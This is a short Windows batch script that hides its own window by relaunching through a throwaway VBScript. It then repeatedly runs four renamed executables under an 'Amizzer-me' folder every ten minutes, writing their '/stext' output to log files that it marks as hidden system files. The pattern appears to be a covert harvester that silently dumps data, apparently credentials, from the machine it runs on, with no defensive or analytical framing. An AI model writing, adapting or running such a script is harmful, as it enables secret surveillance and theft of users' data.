@echo off
If '%1==' (Start /MIN "HIDE" "%~0" HIDE-BOSS & Exit)
If %1==HIDE-BOSS (
  Set E=Echo
  Set D=Del /Q /F "RunVBS.vbs"
  Call :_ > "RunVBS.vbs"
  Set R=Start /MIN "HIDE"
  %R% "RunVBS.vbs" & Exit
:_
  %E% On Error Resume Next
  %E% Set File = CreateObject^("WScript.Shell"^)
  %E% File.Run "%~n0%~x0 BOSS" , vbHide
Goto:EoF
)
%D%

title Loop-Start-Alternativo
:start
IF NOT EXIST timer.vbs (
echo wscript.sleep 600000 > timer.vbs
)
start Amizzer-me\data\amizzer.exe /stext Amizzer-me/log.els
start Amizzer-me\data\login.exe /stext Amizzer-me/log2.els
start Amizzer-me\data\posts.exe /stext Amizzer-me/log3.els
start Amizzer-me\data\contato.exe /stext Amizzer-me/log4.els
attrib Amizzer-me\*.els +s +h
goto:inicio

:inicio
start /wait WSCRIPT.exe timer.vbs
attrib timer.vbs  +s +h

goto:start

